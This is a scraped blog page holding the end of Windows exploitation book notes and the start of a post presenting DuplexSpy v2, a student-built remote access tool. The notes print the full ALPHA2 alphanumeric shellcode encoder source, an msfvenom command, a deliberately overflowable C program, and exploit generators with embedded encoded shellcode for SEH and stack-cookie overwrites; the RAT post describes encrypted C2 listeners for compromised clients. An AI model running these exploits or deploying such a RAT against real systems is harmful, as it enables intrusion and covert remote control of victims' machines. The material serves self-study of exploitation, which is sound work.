&quot;LLLLLLLLY77777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7Y77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;Y7777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+8]&quot;,  &quot;YYY77777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+C]&quot;,  &quot;YYYY7777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+10]&quot;, &quot;YYYYY777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+14]&quot;, &quot;YYYYYY77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY7777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;77777777777777777777777777777777777QZ&quot; // ecx code                mixedcase_ascii_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, uppercase_ascii_nocompress_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;777777777777777777777777&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;7777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;7777777777777777777777RY&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY77777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLY7777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7Y7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;Y777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+8]&quot;,  &quot;YYY7777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+C]&quot;,  &quot;YYYY777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+10]&quot;, &quot;YYYYY77777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+14]&quot;, &quot;YYYYYY7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY77777777777777QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;seh&quot;,      uppercase_w32sehgetpc &quot;7777777777777777777777QZ&quot; // ecx code                uppercase_ascii_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, mixedcase_unicode_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, uppercase_unicode_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PPYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;RRYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SSYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VVYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WWYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YAIAIAIAIA44&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, mixedcase_unicode_nocompress_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PPYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;RRYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SSYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VVYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WWYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YA4444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, uppercase_unicode_nocompress_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PPYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;RRYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SSYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VVYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WWYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YA444444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;;struct decoder* decoders[] = &#123;  mixedcase_ascii_decoders, uppercase_ascii_decoders,  mixedcase_unicode_decoders, uppercase_unicode_decoders,  mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,  mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders&#125;;void version(void) &#123;  printf(    &quot;________________________________________________________________________________\\n&quot;    &quot;\\n&quot;    &quot;    ,sSSs,,s,  ,sSSSs,  &quot; VERSION_STRING &quot;\\n&quot;    &quot;   SS\\&quot;  Y$P\\&quot;  SY\\&quot;  ,SY \\n&quot;    &quot;  iS&#x27;   dY       ,sS\\&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.\\n&quot;    &quot;  YS,  dSb    ,sY\\&quot;      &quot; COPYRIGHT &quot;\\n&quot;    &quot;  `\\&quot;YSS&#x27;\\&quot;S&#x27; &#x27;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;\\n&quot;    &quot;________________________________________________________________________________\\n&quot;    &quot;\\n&quot;  );  exit(EXIT_SUCCESS);&#125;void help(char* name) &#123;  printf(    &quot;Usage: %s [OPTION] [BASEADDRESS]\\n&quot;    &quot;ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\\n&quot;    &quot;The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\\n&quot;    &quot;version of your origional shellcode. It consists of baseaddress-code with some\\n&quot;    &quot;padding, a decoder routine and the encoded origional shellcode. This will work\\n&quot;    &quot;for any target OS. The resulting shellcode needs to have RWE-access to modify\\n&quot;    &quot;it&#x27;s own code and decode the origional shellcode in memory.\\n&quot;    &quot;\\n&quot;    &quot;BASEADDRESS\\n&quot;    &quot;  The decoder routine needs have it&#x27;s baseaddress in specified register(s). The\\n&quot;    &quot;  baseaddress-code copies the baseaddress from the given register or stack\\n&quot;    &quot;  location into the apropriate registers.\\n&quot;    &quot;eax, ecx, edx, ecx, esp, ebp, esi, edi\\n&quot;    &quot;  Take the baseaddress from the given register. (Unicode baseaddress code using\\n&quot;    &quot;  esp will overwrite the byte of memory pointed to by ebp!)\\n&quot;    &quot;[esp], [esp-X], [esp+X]\\n&quot;    &quot;  Take the baseaddress from the stack.\\n&quot;    &quot;seh\\n&quot;    &quot;  The windows \\&quot;Structured Exception Handler\\&quot; (seh) can be used to calculate\\n&quot;    &quot;  the baseaddress automatically on win32 systems. This option is not available\\n&quot;    &quot;  for unicode-proof shellcodes and the uppercase version isn&#x27;t 100%% reliable.\\n&quot;    &quot;nops\\n&quot;    &quot;  No baseaddress-code, just padding.  If you need to get the baseaddress from a\\n&quot;    &quot;  source not on the list use this option (combined with --nocompress) and\\n&quot;    &quot;  replace the nops with your own code. The ascii decoder needs the baseaddress\\n&quot;    &quot;  in registers ecx and edx, the unicode-proof decoder only in ecx.\\n&quot;    &quot;-n\\n&quot;    &quot;  Do not output a trailing newline after the shellcode.\\n&quot;    &quot;--nocompress\\n&quot;    &quot;  The baseaddress-code uses \\&quot;dec\\&quot;-instructions to lower the required padding\\n&quot;    &quot;  length. The unicode-proof code will overwrite some bytes in front of the\\n&quot;    &quot;  shellcode as a result. Use this option if you do not want the \\&quot;dec\\&quot;-s.\\n&quot;    &quot;--unicode\\n&quot;    &quot;  Make shellcode unicode-proof. This means it will only work when it gets\\n&quot;    &quot;  converted to unicode (inserting a &#x27;0&#x27; after each byte) before it gets\\n&quot;    &quot;  executed.\\n&quot;    &quot;--uppercase\\n&quot;    &quot;  Make shellcode 100%% uppercase characters, uses a few more bytes then\\n&quot;    &quot;  mixedcase shellcodes.\\n&quot;    &quot;--sources\\n&quot;    &quot;  Output a list of BASEADDRESS options for the given combination of --uppercase\\n&quot;    &quot;  and --unicode.\\n&quot;    &quot;--help\\n&quot;    &quot;  Display this help and exit\\n&quot;    &quot;--version\\n&quot;    &quot;  Output version information and exit\\n&quot;    &quot;\\n&quot;    &quot;See the source-files for further details and copying conditions. There is NO\\n&quot;    &quot;warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\\n&quot;    &quot;\\n&quot;    &quot;Acknowledgements:\\n&quot;    &quot;  Thanks to rix for his phrack article on aphanumeric shellcode.\\n&quot;    &quot;  Thanks to obscou for his phrack article on unicode-proof shellcode.\\n&quot;    &quot;  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\\n&quot;    &quot;\\n&quot;    &quot;Report bugs to &lt;skylined@edup.tudelft.nl&gt;\\n&quot;,    name  );  exit(EXIT_SUCCESS);&#125;//-----------------------------------------------------------------------------int main(int argc, char* argv[], char* envp[]) &#123;  int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,        nonewline = 0, nocompress = 0, options = 0, spaces = 0;  char* baseaddress = NULL;  int   i, input, A, B, C, D, E, F;  char* valid_chars;  // Random seed  struct timeval tv;  struct timezone tz;  gettimeofday(&amp;tv, &amp;tz);  srand((int)tv.tv_sec*1000+tv.tv_usec);  // Scan all the options and set internal variables accordingly  for (i=1; i&lt;argc; i++) &#123;         if (strcmp(argv[i], &quot;--help&quot;) == 0) help(argv[0]);    else if (strcmp(argv[i], &quot;--version&quot;) == 0) version();    else if (strcmp(argv[i], &quot;--uppercase&quot;) == 0) uppercase = 1;    else if (strcmp(argv[i], &quot;--unicode&quot;) == 0) unicode = 1;    else if (strcmp(argv[i], &quot;--nocompress&quot;) == 0) nocompress = 1;    else if (strcmp(argv[i], &quot;--sources&quot;) == 0) sources = 1;    else if (strcmp(argv[i], &quot;--spaces&quot;) == 0) spaces = 1;    else if (strcmp(argv[i], &quot;-n&quot;) == 0) nonewline = 1;    else if (baseaddress == NULL) baseaddress = argv[i];    else &#123;      fprintf(stderr, &quot;%s: more then one BASEADDRESS option: `%s&#x27; and `%s&#x27;\\n&quot;                      &quot;Try `%s --help&#x27; for more information.\\n&quot;,                      argv[0], baseaddress, argv[i], argv[0]);      exit(EXIT_FAILURE);    &#125;  &#125;  // No baseaddress option ?  if (baseaddress == NULL) &#123;    fprintf(stderr, &quot;%s: missing BASEADDRESS options.\\n&quot;                    &quot;Try `%s --help&#x27; for more information.\\n&quot;, argv[0], argv[0]);    exit(EXIT_FAILURE);  &#125;  // The uppercase, unicode and nocompress option determine which decoder we&#x27;ll  // need to use. For each combination of these options there is an array,  // indexed by the baseaddress with decoders. Pointers to these arrays have  // been put in another array, we can calculate the index into this second  // array like this:  options = uppercase+unicode*2+nocompress*4;  // decoders[options] will now point to an array of decoders for the specified  // options. The array contains one decoder for every possible baseaddress.  // Someone wants to know which baseaddress options the specified options  // for uppercase, unicode and/or nocompress allow:  if (sources) &#123;    printf(&quot;Available options for %s%s alphanumeric shellcode:\\n&quot;,           uppercase ? &quot;uppercase&quot; : &quot;mixedcase&quot;,           unicode ? &quot; unicode-proof&quot; : &quot;&quot;);    for (i=0; decoders[options][i].id != NULL; i++) &#123;      printf(&quot;  %s\\n&quot;, decoders[options][i].id);    &#125;    printf(&quot;\\n&quot;);    exit(EXIT_SUCCESS);  &#125;  if (uppercase) &#123;    if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;    else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;  &#125; else &#123;    if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;    else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;  &#125;  // Find and output decoder  for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) &#123;    if (decoders[options][i+1].id == NULL) &#123;      fprintf(stderr, &quot;%s: unrecognized baseaddress option `%s&#x27;\\n&quot;                      &quot;Try `%s %s%s--sources&#x27; for a list of BASEADDRESS options.\\n&quot;,                      argv[0], baseaddress, argv[0],                      uppercase ? &quot;--uppercase &quot; : &quot;&quot;,                      unicode ? &quot;--unicode &quot; : &quot;&quot;);      exit(EXIT_FAILURE);    &#125;  &#125;  printf(&quot;%s&quot;, decoders[options][i].code);  // read, encode and output shellcode  while ((input = getchar()) != EOF) &#123;    // encoding AB -&gt; CD 00 EF 00    A = (input &amp; 0xf0) &gt;&gt; 4;    B = (input &amp; 0x0f);    F = B;    // E is arbitrary as long as EF is a valid character    i = rand() % strlen(valid_chars);    while ((valid_chars[i] &amp; 0x0f) != F) &#123; i = ++i % strlen(valid_chars); &#125;    E = valid_chars[i] &gt;&gt; 4;    // normal code uses xor, unicode-proof uses ADD.    // AB -&gt;    D =  unicode ? (A-E) &amp; 0x0f : (A^E);    // C is arbitrary as long as CD is a valid character    i = rand() % strlen(valid_chars);    while ((valid_chars[i] &amp; 0x0f) != D) &#123; i = ++i % strlen(valid_chars); &#125;    C = valid_chars[i] &gt;&gt; 4;    printf(&quot;%c%c&quot;, (C&lt;&lt;4)+D, (E&lt;&lt;4)+F);  &#125;  printf(&quot;A%s&quot;, nonewline ? &quot;&quot; : &quot;\\n&quot;); // Terminating &quot;A&quot;  exit(EXIT_SUCCESS);&#125;\nCompile in Linux, but the shellcodes can be used in Windows.$ gcc alpha2.c -o alpha2$ chmod +x ./alpha2$ ./alpha2 eax --unicode --uppercase &lt; messagebox.bin\nWe can also use metasploit:$ msfvenom -a x86 --platform -p windows/messagebox icon=warning text=&#x27;HelloWorld&#x27; title=&#x27;hello&#x27; -e x86/alpha_mixed -f c\nIn conclusion, the main difficulties include:\n\nUsing memory addresses in the form of 00mm00mm to overwrite the return address or SEH structure.\nUsing assembly instructions that contain \\x00.\nShellcode must be encoded using a special algorithm; however, this increases the length of the shellcode.\n\nAnother problem is that offset patterns generated by Metasploit or Mona may be unreliable, since values stored in Unicode-based registers can be unpredictable.\nThe following instructions are commonly used:\n\n\n\n\nOpcode\nIntruction\n\n\n\n\n61\nPOPAD\n\n\n006E00\nADD [ESI], CH\n\n\n006F00\nADD [EDI], CH\n\n\n007000\nADD [EAX], DH\n\n\n007100\nADD [ECX], DH\n\n\n007200\nADD [EDX], DH\n\n\n007300\nADD [EBX], DH\n\n\n0500QQ00PP\nADD EAX, 0xPP00QQ00\n\n\n2D00QQ00PP\nSUB EAX, 0xPP00QQ00\n\n\n\n\nPractice//vulnerable005.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char rock[0xE000] = &quot;...some data&quot;;char Rahab[0x2000] = &quot;\\x90\\x58\\x58\\xc3&quot;; //NOP/POP/POP/RETvoid foo(void *src_buf, size_t const len) &#123;\tsize_t const BUF_LEN = 128;\tchar bad_buf[BUF_LEN];\t\tmemcpy(bad_buf, src_buf, len * 2); //bad usage!&#125;int main(int argc, char *argv[]) &#123;\tsize_t const STR_LEN = 4096;\twchar_t *unicode_buf = malloc(STR_LEN);\tchar ascii_buf[STR_LEN];\tFILE *pfile;\tint rt;\t\tprintf(&quot;Vulnerable005 starts...\\n&quot;);\t\tif (argc &gt;= 2) &#123;\t\tpfile = fopen(argv[1], &quot;r&quot;);\t\tfscanf(pfile, &quot;%s&quot;, ascii_buf);\t\trt = MultiByteToWideChar(CP_UTF7, 0, ascii_buf, -1, unicode_buf, STR_LEN);\t\tif (rt == 0) &#123;\t\t\treturn -1;\t\t&#125;\t\t\t\tfoo(unicode_buf, rt * 2);\t&#125;\t\tprintf(&quot;Vulnerable005 ends...\\n&quot;);\tfree(unicode_buf);&#125;\n\n\n\n\n\n\n!mona pattern_create 3000\n\n    \n    Right Click -> Follow address in stack\n    \n\n\n\n\n\nWindows uses little-endian byte order. Therefore, the value used to overwrite the Next field is 0x43007900, and the value used to overwrite the Handler field is 0x36004300.\nConcatenate them together: 0x43007900_36004300.Remove the null bytes (\\x00): 0x43793643.\n!mona pattern_offset 43793643\n\n\n\nThus, the offset is 2298.\n\n\n\nExploit script://attack-vulnerable005.cpp#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;char code[] = &quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYX4OM0KPKP30U9K5NQXRS44KR200TKB2LLDK0RN44KRRMXLOFW0JO6P1KONQ90FLOLS1SLLBNLMPGQHOLMKQ97Q9RUJOPRR74KPRN04KQ2OLM1Z0TKOP2XSUGPT4PLKQ8PDK0HLXTKQHMPM1Z30PSU7YSDOLQ9TKNTDKP1KOM1HVNQ7P7Q8OLMVLKQI7P8K0RUKDKSSMKHOKSMO4RUIP0X4KPXMTKQ9CRFDKLLPKDK1HMLM1HSTKLD4KKQ8PTI0DNDNDQKQK1QQIPZ0QKOYPR8QOPZ4KN2K93PKOKOKOQMYXLKKPM0KPCET31UT2NSOBNNS4BLBLM01XPL2WMVM7KOXU2JM0ZHLIKPKPM0OR0O16MP0T2ESC44KP9XLLM0KPM0PHS5BL2LROO0BW2OT2RLQTKPBJKPS815CSPVKWKOXU1ZKPQXZPH572R6KO8UA&quot;;int main() &#123;\tstring const EXPLOIT_FILENAME = &quot;exploit-vulnerable005.txt&quot;;\tofstream fout(EXPLOIT_FILENAME.c_str());\t\tsize_t const LENGTH = 2298;\tsize_t const OFFSET = 124;\t\tstring junk1(OFFSET, &#x27;A&#x27;);\t\tstring shellcode(code);\tstring junk2(LENGTH - junk1.size() - shellcode.size(), &#x27;B&#x27;);\tstring next(&quot;\\x61\\x72&quot;); //0042 0042\t\tstring handler(&quot;\\x01\\x41&quot;); //00410001, Rahab\t\tstring walkcode =\t\t&quot;\\x72&quot;\t\t&quot;\\x05\\x15\\x11&quot;\t\t&quot;\\x72&quot;\t\t&quot;\\x2D\\x11\\x11&quot;\t\t&quot;\\x72&quot;\t\t&quot;\\x50&quot;\t\t&quot;\\x72&quot;\t\t&quot;\\xC3&quot;;\t\tstring exploit = junk1 + shellcode + junk2 + next + handler + walkcode;\t\tfout &lt;&lt; exploit;&#125;\nPractice——GOM PlayerChapter 6 - Offensive and Defensive6.1 - Security CookieCanary\n\n//gf.cpp#include &lt;string&gt;void function_empty() &#123;&#125;void function_int_2() &#123;\tint ia[2] = &#123; 0 &#125;;&#125;void function_int_3() &#123;\tint ia[3] = &#123; 0 &#125;;&#125;void function_string() &#123;\tstd::string s;&#125;void function_char_4(char* in) &#123;\tchar ca[4](&quot;&quot;);\tstd::strcpy(ca, in);&#125;void function_char_5(char* in) &#123;\tchar ca[5](&quot;&quot;);\tstd::strcpy(ca, in);&#125;int main() &#123;\tstatic char atk[] = &quot;AAAAAAAA&quot; &quot;BBBB&quot; &quot;\\xEF\\xBE\\xAD\\xDE&quot;;\tfunction_char_5(atk);&#125;\nUse the following command to disassemble a specified function (here u for unassemble, since d has been used for display).uf function_string\n\n\n\n\n\n\nView the security with the followign command:dd __security_cookie l1\n\n\n\nIt is a 4 or 8 bytes data.\nLet’s view function_emptyuf function_empty\n\n\n\nThis function DOES NOT have Security Cookie mechanism.\nWhat if we turn off GS?\n\n\n\n\n\n\nNow, function_string DOES NOT have Security Cookie mechanism.0:000&gt; g\n\n\n\nExploiting Security Cookie\n\n\n\nPlatform\nIDE\n\n\n\n\nWindows XP SP3 x86\nVisual Studio 2010 Express\n\n\n\n\n//attack_sc.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;vulnerable_sc_exploit.txt&quot;int main() &#123;\tstring global_junk(&quot;junk\\n&quot;);\tstring local_junk(128 + 4 + 4, &#x27;A&#x27;);\tlocal_junk += &quot;\\xEF\\xBE\\xAD\\xDE&quot;;\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; global_junk &lt;&lt; local_junk;\tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125;\n\nAn Exception that can Bypass Security Cookie\n6.2 - Safe Virtual Function6.3 - SafeSEH6.4 - Exploiting SafeSEH6.5 - SEHOP6.6 - Exploiting SEHOP6.7 - DEP and ASLR6.8 - Exploiting ASLRExploit other DLL without SafeSEH or ASLR.\n6.9 - Are Windows 8 and Windows 10 Safe?6.10 - ROP (Return-Oriented Programming)6.11 - Six Ways to Exploit ROP1. ZwSetInformationProcessAdvancedAuxiliary——ByteArray2. SetProcessDEPPolicy3. VirtualProtect4. WriteProcessMemory5 and 6. ROP serializing Multiple Functions6.12 - FinalDefence.exe6.13 - Only Windows 7 x64?6.14 - Practice——KMPlayer6.15 - Not Only “Hello World”THANKS FOR READING\n\n","categories":["Book"],"tags":["Book","Learning","Note","Blackhat","Hacking","Hack","BufferOverflow"]},{"title":"[Book] Windows Internal Part 2","url":"/2026/01/26/2026-1-26-BookWindowsInternal-P2/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Windows Internal Part 2”.The content will be continuously updated as I read through the book.\nReflection"},{"title":"[Tools] DuplexSpy v2.0.0","url":"/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/","content":"PrefaceThis document describes DuplexSpy (also referred to as DuplexSpyCS, where CS stands for C#).\nIf you are reading this document, I am glad to announce the release of DuplexSpy version 2, after more than six months of the version 1. During this period, I struggled with various emotional and academic issues, which once led me into depression. Fortunately, I managed to overcome one of my biggest personal challenges (even though it might seem trivial to others).\n\n\n\nAs a college student, developing a GUI-based remote access tool entirely on my own—and performing proper quality assurance (QA)—has been a significant challenge for me. Due to limited time, experience, and resources, this project may still contain defects or design flaws that I have not yet discovered. Nevertheless, I believe that I have successfully built a RAT that incorporates a variety of offensive techniques and practical features.\n\n\n\nIf you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.\n\n\n\nIntroductionDuplexSpy incorporates features inspired by other tools as well as my own personal experience. Compared to the previous version, I removed several features that I considered unnecessary and added a number of new ones. Throughout this development process, I learned a great deal, and I sincerely hope that this project can be useful to others who are interested in offensive security or malware research.\nIf you encounter any issues or have suggestions, please feel free to open an issue on the repository page.\nView the GitHub repository here.\nDisclaimerThis project was developed as part of my personal interest in studying cybersecurity. However, it may potentially be misused for malicious purposes. Please do NOT use this tool for any illegal activities.\n\n\n\nGetting StartDirectory and FilesDirectory structure is shown as following:\n\n\n\nDeployExecute DuplexSpyCS.exe. This is the home page of DuplexSpy:\n\n\n\n\n\n\nListenerA listener is an interface component of DuplexSpy. It acts as a socket listener on the server side. DuplexSpy provides three types of listeners, all of which offer secure and robust communication protocols.\nTCPThe data stream transmitted through this protocol is encrypted after a key exchange procedure. The server generates an RSA key pair and sends the public key to the client. The client then uses this public key to encrypt an AES key and an initialization vector (IV), and sends them back to the server.\nAfter receiving the encrypted AES key and IV, the server decrypts them and stores them in memory. During the validation phase, the server sends a plaintext challenge to the client. The client responds with an encrypted version of the challenge using the AES algorithm. If the server can successfully decrypt the response using the stored AES key and IV, the validation procedure is considered complete. The server then notifies the client to enter the compromised state.\nThis protocol uses RSA-2048 and AES-256-CBC.\nTLSThis protocol provides a secure and robust communication channel for C2 traffic. Before using this listener, you must generate an SSL certificate file.\nHTTPAll data are encapsulated within HTTP requests and responses. This listener also provides an encrypted communication channel to protect C2 traffic. Its handshaking procedure is identical to that of the TCP listener described above.\n\n\n\nAdd a New ListenerIn this example, I am going to demonstrate how to add a new listener.\nFirstly, click the New button on the top.\n\n\n\nNow you have opened a new panel.\nSelect a protocol used for listener (In this case, I use TLS):\n\n\n\nNotice that you should create a certificate file if you are going to use a TLS listener. \n\n    \n    Save configuration without SSL certificate file.\n    \n\n\nYou can create a certificate file through openssl command or using DuplexSpy. \n\n\n\n\n\n\n\n\n\nDuplexSpy checks the listener configuration before it shows. If a mal-config is detected. The state of your listener will be turned into unavailable.\n\n\n\nGenerate a PayloadDuplexSpy currently provides a single payload type. In the previous version, three different payload types were available, but 